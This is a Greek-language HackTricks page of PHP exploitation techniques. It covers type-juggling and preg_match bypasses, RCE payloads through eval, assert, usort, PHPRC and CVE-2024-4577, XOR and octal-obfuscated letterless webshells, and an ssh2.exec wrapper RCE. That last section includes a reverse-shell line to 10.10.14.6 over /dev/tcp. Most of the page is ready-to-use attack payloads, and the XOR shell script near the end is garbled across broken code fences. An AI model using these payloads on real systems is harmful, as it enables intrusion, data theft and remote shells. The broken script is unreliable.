# PHP Κόλπα

{{#include ../../../banners/hacktricks-training.md}}

## Συνήθεις τοποθεσίες Cookies:

Αυτό ισχύει επίσης για τα phpMyAdmin cookies.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Τοποθεσίες:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Παράκαμψη συγκρίσεων PHP

### Loose comparisons/Type Juggling ( == )

Εάν χρησιμοποιείται `==` στο PHP, υπάρχουν απροσδόκητες περιπτώσεις όπου η σύγκριση δεν συμπεριφέρεται όπως αναμένεται. Αυτό συμβαίνει γιατί το "==" συγκρίνει μόνο τιμές μετασχηματισμένες στον ίδιο τύπο — αν θέλετε επίσης να συγκρίνετε ότι ο τύπος των δεδομένων είναι ο ίδιος πρέπει να χρησιμοποιήσετε `===`.

PHP comparison tables: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../images/image (567).png>)

{{#file}}
EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf
{{#endfile}}

- `"string" == 0 -> True` Μια συμβολοσειρά που δεν ξεκινά με αριθμό είναι ίση με έναν αριθμό
- `"0xAAAA" == "43690" -> True` Οι συμβολοσειρές που αποτελούνται από αριθμούς σε δεκαδική ή hex μορφή μπορούν να συγκριθούν με άλλους αριθμούς/συμβολοσειρές με αποτέλεσμα True εάν οι αριθμοί ήταν ίδιοι (οι αριθμοί σε μια συμβολοσειρά ερμηνεύονται ως αριθμοί)
- `"0e3264578" == 0 --> True` Μια συμβολοσειρά που ξεκινά με "0e" και ακολουθείται από οτιδήποτε θα είναι ίση με 0
- `"0X3264578" == 0X --> True` Μια συμβολοσειρά που ξεκινά με "0" και ακολουθείται από οποιοδήποτε γράμμα (το X μπορεί να είναι οποιοδήποτε γράμμα) και μετά από οτιδήποτε θα είναι ίση με 0
- `"0e12334" == "0" --> True` Αυτό είναι πολύ ενδιαφέρον γιατί σε ορισμένες περιπτώσεις μπορείτε να ελέγξετε την είσοδο της συμβολοσειράς του "0" και κάποιο περιεχόμενο που γίνεται hash και συγκρίνεται με αυτήν. Επομένως, εάν μπορείτε να παρέχετε μια τιμή που θα δημιουργεί ένα hash που ξεκινά με "0e" και χωρίς κανένα γράμμα, θα μπορούσατε να παρακάμψετε τη σύγκριση. Μπορείτε να βρείτε **ήδη κατακερματισμένες συμβολοσειρές** με αυτή τη μορφή εδώ: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` Οποιοδήποτε γράμμα σε μια συμβολοσειρά ισούται με το int 0

Περισσότερες πληροφορίες στο [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in_array()**

**Type Juggling** επηρεάζει επίσης τη συνάρτηση `in_array()` εξ ορισμού (πρέπει να ορίσετε το τρίτο όρισμα σε true για να κάνετε αυστηρή σύγκριση):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Αν αυτή η συνάρτηση χρησιμοποιείται για **οποιονδήποτε έλεγχο ταυτότητας** (π.χ. έλεγχο του password) και ο χρήστης ελέγχει μία πλευρά της σύγκρισης, μπορεί να στείλει ένα κενό array αντί για string ως τιμή του password (`https://example.com/login.php/?username=admin&password[]=`) και να παρακάμψει αυτόν τον έλεγχο:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Το ίδιο σφάλμα συμβαίνει με το `strcasecmp()`

### Strict type Juggling

Ακόμα και αν το `===` **χρησιμοποιείται** μπορεί να υπάρχουν σφάλματα που καθιστούν τη **σύγκριση ευάλωτη** στο **type juggling**. Για παράδειγμα, αν η σύγκριση **μετατρέπει τα δεδομένα σε διαφορετικό τύπο αντικειμένου πριν τη σύγκριση**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg_match(/^.\*/)

**`preg_match()`** μπορεί να χρησιμοποιηθεί για να **validate user input** (ελέγχει αν οποιαδήποτε **word/regex** από μια **blacklist** είναι **present** στο **user input** και αν δεν είναι, ο κώδικας μπορεί να συνεχίσει την εκτέλεσή του).

#### Παράκαμψη νέας γραμμής

Ωστόσο, όταν οριοθετείται η αρχή του regexp, το `preg_match()` **only checks the first line of the user input**, οπότε αν με κάποιον τρόπο μπορείτε να **send** το input σε **several lines**, θα μπορέσετε να bypass αυτόν τον έλεγχο. Παράδειγμα:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Για να παρακάμψετε αυτόν τον έλεγχο μπορείτε να **στείλετε την τιμή με νέες γραμμές urlencoded** (`%0A`) ή αν μπορείτε να στείλετε **JSON data**, στείλτε το σε **πολλές γραμμές**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Βρείτε ένα παράδειγμα εδώ: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Σφάλμα μήκους bypass**

(Αυτή η bypass δοκιμάστηκε προφανώς σε PHP 5.2.5 και δεν μπόρεσα να την κάνω να λειτουργήσει σε PHP 7.3.15)\
Εάν μπορείτε να στείλετε στο `preg_match()` ένα έγκυρο, πολύ **μεγάλο input**, τότε **δεν θα μπορέσει να το επεξεργαστεί** και θα μπορέσετε να **bypass** τον έλεγχο. Για παράδειγμα, αν κάνει blacklisting ένα JSON θα μπορούσατε να στείλετε:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Κόλπο από: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../images/image (26).png" alt=""><figcaption></figcaption></figure>

Εν συντομία, το πρόβλημα συμβαίνει επειδή οι `preg_*` συναρτήσεις στο PHP βασίζονται στη [PCRE library](http://www.pcre.org/). Στην PCRE, ορισμένα regular expressions ταιριάζουν χρησιμοποιώντας πολλές recursive calls, οι οποίες καταναλώνουν πολύ stack space. Είναι δυνατόν να ορίσεις ένα όριο στον αριθμό των recursions που επιτρέπονται, αλλά στο PHP αυτό το όριο [defaults to 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) το οποίο είναι περισσότερο από ό,τι χωράει στο stack.

[This Stackoverflow thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) επίσης συνδέθηκε στο post όπου συζητιέται πιο αναλυτικά αυτό το θέμα. Η αποστολή μας έγινε τώρα σαφής:\
**Στείλε ένα input που θα έκανε το regex να εκτελέσει 100_000+ recursions, προκαλώντας SIGSEGV, κάνοντας τη συνάρτηση `preg_match()` να επιστρέψει `false`, με αποτέλεσμα η εφαρμογή να πιστεύει ότι το input μας δεν είναι malicious, προσθέτοντας την έκπληξη στο τέλος του payload κάτι σαν `{system(<verybadcommand>)}` για να πάρουμε SSTI --> RCE --> flag :)**.

Λοιπόν, σε όρους regex, στην πραγματικότητα δεν κάνουμε 100k "recursions", αλλά αντίθετα μετράμε "backtracking steps", τα οποία όπως αναφέρει η [PHP documentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) default to 1_000_000 (1M) στην μεταβλητή `pcre.backtrack_limit`.\
Για να το φτάσουμε, `'X'*500_001` θα καταλήξει σε 1 εκατομμύριο backtracking steps (500k μπροστά και 500k πίσω):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling για PHP obfuscation
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Εάν το PHP ανακατευθύνει σε άλλη σελίδα αλλά δεν καλείται καμία συνάρτηση **`die`** ή **`exit`** μετά τη ρύθμιση της κεφαλίδας `Location`, το PHP συνεχίζει να εκτελείται και να προσθέτει τα δεδομένα στο σώμα:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal and File Inclusion Exploitation

Έλεγξε:


{{#ref}}
../../../pentesting-web/file-inclusion/
{{#endref}}

## Περισσότερα κόλπα

- **register_globals**: Σε **PHP < 4.1.1.1** ή αν είναι λάθος διαμορφωμένο, το **register_globals** μπορεί να είναι ενεργό (ή η συμπεριφορά του να μιμείται). Αυτό σημαίνει ότι σε global μεταβλητές όπως $\_GET αν έχουν μια τιμή π.χ. $\_GET\["param"]="1234", μπορείτε να το προσπελάσετε μέσω του **$param**. Επομένως, στέλνοντας HTTP παραμέτρους μπορείτε να αντικαταστήσετε μεταβλητές που χρησιμοποιούνται μέσα στον κώδικα.
- Η **PHPSESSION cookies of the same domain are stored in the same place**, επομένως αν μέσα σε ένα domain **different cookies are used in different paths** μπορείτε να κάνετε ώστε μια διαδρομή **accesses the cookie of the path** ρυθμίζοντας την τιμή του cookie της άλλης διαδρομής.\
Με αυτόν τον τρόπο, αν **both paths access a variable with the same name** μπορείτε να κάνετε ώστε η **value of that variable in path1 apply to path2**. Και τότε το path2 θα θεωρήσει έγκυρες τις μεταβλητές του path1 (δίνοντας στο cookie το όνομα που αντιστοιχεί σε αυτό στο path2).
- Όταν έχετε τα **ονόματα χρηστών** των χρηστών της μηχανής, ελέγξτε τη διεύθυνση: **/\~\<USERNAME>** για να δείτε αν οι php κατάλογοι είναι ενεργοποιημένοι.
- Αν μια php config έχει **`register_argc_argv = On`** τότε query params διαχωρισμένα με κενά χρησιμοποιούνται για να γεμίσουν τον πίνακα των arguments **`array_keys($_SERVER['argv'])`** σαν να ήταν **arguments from the CLI**. Αυτό είναι ενδιαφέρον γιατί αν αυτή η ρύθμιση είναι off, η τιμή του args array θα είναι `Null` όταν καλείται από το web καθώς ο πίνακας args δεν θα γεμίζει. Επομένως, αν μια σελίδα προσπαθεί να ελέγξει αν τρέχει ως web ή ως CLI με μια σύγκριση όπως `if (empty($_SERVER['argv'])) {` ένας attacker μπορεί να στείλει παραμέτρους στο GET request όπως `?--configPath=/lalala` και θα θεωρήσει ότι τρέχει σαν CLI και πιθανώς θα κάνει parse και θα χρησιμοποιήσει αυτά τα arguments. Περισσότερα στο [αρχικό writeup](https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms).
- [**LFI and RCE using php wrappers**](../../../pentesting-web/file-inclusion/index.html)

### password_hash/password_verify

Αυτές οι συναρτήσεις χρησιμοποιούνται συνήθως σε PHP για να **παράγουν hashes από κωδικούς** και για να **ελέγξουν** αν ένας κωδικός είναι σωστός σε σύγκριση με ένα hash.\
Οι υποστηριζόμενοι αλγόριθμοι είναι: `PASSWORD_DEFAULT` και `PASSWORD_BCRYPT` (ξεκινά με `$2y$`). Σημειώστε ότι **PASSWORD_DEFAULT είναι συχνά το ίδιο με PASSWORD_BCRYPT.** Και επί του παρόντος, **PASSWORD_BCRYPT** έχει ένα **όριο μεγέθους εισόδου 72bytes**. Επομένως, όταν προσπαθήσετε να κάνετε hash κάτι μεγαλύτερο από 72bytes με αυτόν τον αλγόριθμο, θα χρησιμοποιηθούν μόνο τα πρώτα 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusing PHP errors

#### Causing error after setting headers

From [**this twitter thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19) μπορείτε να δείτε ότι αν στείλετε περισσότερα από 1000 GET params ή 1000 POST params ή 20 files, το PHOP δεν θα ορίσει headers στην απάντηση.

Αυτό επιτρέπει, για παράδειγμα, την παράκαμψη των CSP headers που ορίζονται σε κώδικες όπως:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Συμπλήρωση σώματος πριν από τον ορισμό των κεφαλίδων

Αν μια **PHP σελίδα εμφανίζει σφάλματα και επιστρέφει με echo κάποια είσοδο που παρείχε ο χρήστης**, ο χρήστης μπορεί να κάνει τον PHP server να εκτυπώσει κάποιο **περιεχόμενο αρκετά μεγάλο** έτσι ώστε όταν προσπαθήσει να **προσθέσει τις κεφαλίδες** στην απάντηση ο server να πετάξει σφάλμα.\
Στο ακόλουθο σενάριο ο **επιτιθέμενος προκάλεσε στον server μεγάλα σφάλματα**, και όπως φαίνεται στην οθόνη όταν το php προσπάθησε να **τροποποιήσει τις πληροφορίες των κεφαλίδων, δεν μπόρεσε** (οπότε για παράδειγμα το CSP header δεν εστάλη στον χρήστη):

![](<../../../images/image (1085).png>)

## SSRF σε συναρτήσεις PHP

Δείτε τη σελίδα:


{{#ref}}
php-ssrf.md
{{#endref}}

## ssh2.exec stream wrapper RCE
When the `ssh2` extension is installed (`ssh2.so` visible under `/etc/php*/mods-available/`, `php -m`, or even an FTP-accessible `php8.1_conf/` directory), PHP registers `ssh2.*` wrappers that can be abused anywhere user input is concatenated into `fopen()/file_get_contents()` targets. An admin-only download helper such as:
```php
$wrapper = strpos($_GET['format'], '://') !== false ? $_GET['format'] : '';
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```
είναι αρκετό για να εκτελέσετε εντολές shell μέσω localhost SSH:
```http
GET /download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/ping%2010.10.14.6%20-c%201#
```
* Το credential μέρος μπορεί να επαναχρησιμοποιήσει οποιοδήποτε leaked system password (π.χ., από cracked bcrypt hashes).
* Ο επακόλουθος `#` σχολιάζει το server-side suffix (`files/<id>.zip`), οπότε εκτελείται μόνο η εντολή σου.
* Το Blind RCE επιβεβαιώνεται παρακολουθώντας egress με `tcpdump -ni tun0 icmp` ή σερβίροντας ένα HTTP canary.

Αντικαταστήστε την εντολή με ένα reverse shell payload μόλις επαληθευτεί:
```http
format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/10.10.14.6/443%200>&1'#
```
Επειδή όλα συμβαίνουν μέσα στον PHP worker, η σύνδεση TCP προέρχεται από το target και κληρονομεί τα προνόμια του injected account (`yuri`, `eric`, κ.λπ.).

## Εκτέλεση κώδικα

**system("ls");**\
**\`ls\`;**\
**shell_exec("ls");**

[Check this for more useful PHP functions](php-useful-functions-disable_functions-open_basedir-bypass/index.html)

### **RCE μέσω** **preg_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Για να εκτελεστεί ο κώδικας στο όρισμα "replace" απαιτείται τουλάχιστον ένα match.\
Αυτή η επιλογή του preg_replace έχει **αποσυρθεί από την έκδοση PHP 5.5.0.**

### **RCE via Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

Αυτή η συνάρτηση μέσα σε php επιτρέπει να **εκτελεστεί κώδικας που είναι γραμμένος σε ένα string** προκειμένου να **επιστρέψει true ή false** (και ανάλογα να αλλάξει την εκτέλεση). Συνήθως η μεταβλητή του χρήστη θα εισαχθεί στο μέσο ενός string. Για παράδειγμα:\
`assert("strpos($_GET['page']),'..') === false")` --> Σε αυτή την περίπτωση για να πετύχετε **RCE** θα μπορούσατε να κάνετε:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Θα χρειαστεί να **σπάσετε** το code **syntax**, **προσθέσετε** το **payload** σας, και μετά να **το φτιάξετε ξανά**. Μπορείτε να χρησιμοποιήσετε **logic operations** όπως "**and" ή "%26%26" ή "|"**. Σημειώστε ότι "or", "||" δεν λειτουργούν γιατί αν η πρώτη συνθήκη είναι true το payload μας δεν θα εκτελεστεί. Με τον ίδιο τρόπο το ";" δεν λειτουργεί καθώς το payload μας δεν θα εκτελεστεί.

**Άλλη επιλογή** είναι να προσθέσετε στο string την εκτέλεση της εντολής: `'.highlight_file('.passwd').'`

**Άλλη επιλογή** (αν έχετε τον internal code) είναι να τροποποιήσετε κάποια μεταβλητή για να αλλάξετε την εκτέλεση: `$file = "hola"`

### **RCE via usort()**

Αυτή η function χρησιμοποιείται για να ταξινομήσει ένα array στοιχείων χρησιμοποιώντας μια συγκεκριμένη function.\
Για να εκμεταλλευτείτε αυτή τη function:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
You can also use **//** to comment the rest of the code.

To discover the number of parenthesis that you need to close:

- `?order=id;}//`: we get an error message (`Parse error: syntax error, unexpected ';'`). We are probably missing one or more brackets.
- `?order=id);}//`: we get a **warning**. That seems about right.
- `?order=id));}//`: we get an error message (`Parse error: syntax error, unexpected ')' i`). We probably have too many closing brackets.

### **RCE μέσω .httaccess**

If you can **upload** a **.htaccess**, then you can **configure** several things and even execute code (configuring that files with extension .htaccess can be **executed**).

Different .htaccess shells can be found [here](https://github.com/wireghoul/htshells)

### RCE μέσω μεταβλητών περιβάλλοντος

If you find a vulnerability that allows you to **modify env variables in PHP** (and another one to upload files, although with more research maybe this can be bypassed), you could abuse this behaviour to get **RCE**.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path): This env variable allows you load arbitrary libraries when executing other binaries (although in this case it might not work).
- **`PHPRC`** : Instructs PHP on **where to locate its configuration file**, usually called `php.ini`. If you can upload your own config file, then, use `PHPRC` to point PHP at it. Add an **`auto_prepend_file`** entry specifying a second uploaded file. This second file contains normal **PHP code, which is then executed** by the PHP runtime before any other code.
1. Upload a PHP file containing our shellcode
2. Upload a second file, containing an **`auto_prepend_file`** directive instructing the PHP preprocessor to execute the file we uploaded in step 1
3. Set the `PHPRC` variable to the file we uploaded in step 2.
- Get more info on how to execute this chain [**from the original report**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
- **PHPRC** - another option
- If you **cannot upload files**, you could use in FreeBSD the "file" `/dev/fd/0` which contains the **`stdin`**, being the **body** of the request sent to the `stdin`:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- Or to get RCE, enable **`allow_url_include`** and prepend a file with **base64 PHP code**:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Technique [**from this report**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

The webserver parses HTTP requests and passes them to a PHP script executing a request such as as [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar&ref=labs.watchtowr.com) as `php.exe cgi.php foo=bar`, which allows a parameter injection. This would allow to inject the following parameters to load the PHP code from the body:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Επιπλέον, είναι δυνατό να εισαχθεί η παράμετρος "-" χρησιμοποιώντας τον χαρακτήρα 0xAD λόγω μεταγενέστερης κανονικοποίησης του PHP. Δείτε το exploit example από [**this post**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**In this post**](https://blog.redteam-pentesting.de/2024/moodle-rce/) είναι δυνατό να βρείτε εξαιρετικές ιδέες για να δημιουργήσετε brain fuck PHP code όπου επιτρέπονται πολύ λίγοι χαρακτήρες.\ Επιπλέον προτείνεται ένας ενδιαφέρων τρόπος εκτέλεσης συναρτήσεων που τους επέτρεψε να παρακάμψουν αρκετούς ελέγχους:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP Static analysis

Δες αν μπορείς να εισάγεις code σε κλήσεις αυτών των συναρτήσεων (από [here](https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Εάν αποσφαλματώνετε μια εφαρμογή PHP μπορείτε να ενεργοποιήσετε παγκοσμίως την εμφάνιση σφαλμάτων στο αρχείο `/etc/php5/apache2/php.ini` προσθέτοντας `display_errors = On` και να επανεκκινήσετε τον apache: `sudo systemctl restart apache2`

### Αποκωδικοποίηση κώδικα PHP

Μπορείτε να χρησιμοποιήσετε την ιστοσελίδα [**www.unphp.net**](http://www.unphp.net) για να αποαποκωδικοποιήσετε κώδικα PHP.

## PHP Wrappers & Protocols

Τα PHP Wrappers και τα protocols μπορούν να σας επιτρέψουν να **παρακάμψετε τις προστασίες εγγραφής και ανάγνωσης** σε ένα σύστημα και να το παραβιάσετε. Για [**περισσότερες πληροφορίες δείτε αυτή τη σελίδα**](../../../pentesting-web/file-inclusion/index.html#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug RCE χωρίς αυθεντικοποίηση

Εάν δείτε ότι ο **Xdebug** είναι **ενεργοποιημένος** στην έξοδο του `phpconfig()` θα πρέπει να προσπαθήσετε να αποκτήσετε RCE μέσω [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Μεταβλητές μεταβλητών
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE εκμετάλλευση new $\_GET\["a"]\($\_GET\["b"])

Αν σε μια σελίδα μπορείτε να **δημιουργήσετε ένα νέο αντικείμενο οποιασδήποτε κλάσης** μπορεί να καταφέρετε να αποκτήσετε RCE, δείτε την παρακάτω σελίδα για να μάθετε πώς:


{{#ref}}
php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md
{{#endref}}

## Εκτέλεση PHP χωρίς γράμματα

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Χρήση οκταδικού
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR εύκολο shell code

Σύμφωνα με [**this writeup** ](https://mgp25.com/ctf/Web-challenge/), είναι δυνατόν να δημιουργηθεί ένας απλός shellcode με αυτόν τον τρόπο:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Άρα, αν μπορείς να **εκτελείς αυθαίρετο PHP χωρίς αριθμούς και γράμματα**, μπορείς να στείλεις ένα αίτημα όπως το παρακάτω, εκμεταλλευόμενος αυτό το payload για να εκτελέσεις αυθαίρετο PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Για πιο αναλυτική εξήγηση, δείτε [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match)

### XOR Shellcode (inside eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Παρόμοιο με Perl
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
## Αναφορές
- [0xdf – HTB Era: abusing ssh2.exec stream wrappers](https://0xdf.gitlab.io/2025/11/29/htb-era.html)

{{#include ../../../banners/hacktricks-training.md}}
